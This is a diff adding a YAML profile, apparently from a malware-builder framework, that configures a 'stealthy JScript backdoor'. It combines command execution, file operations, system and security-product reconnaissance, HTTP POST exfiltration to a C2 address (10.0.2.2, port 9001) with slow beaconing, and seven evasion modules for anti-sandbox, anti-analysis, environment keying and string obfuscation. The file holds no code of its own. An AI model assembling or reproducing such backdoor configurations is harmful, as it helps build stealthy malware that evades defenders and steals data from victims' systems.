@@ -1,0 +1,29 @@
+name: js_backdoor_stealth
+description: Stealthy JScript backdoor with full evasion and slow beacon
+format: jscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/sysinfo
+  - collectors/security_products
+
+exfil: exfil/http_post
+arch: arch/backdoor
+
+evasion:
+  - evasion/anti_sandbox
+  - evasion/anti_analysis
+  - evasion/env_keying
+  - evasion/deferred_exec
+  - evasion/behavioral_pacing
+  - evasion/triggered_exec
+  - evasion/string_obfusc
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  BEACON_INTERVAL: "120000"
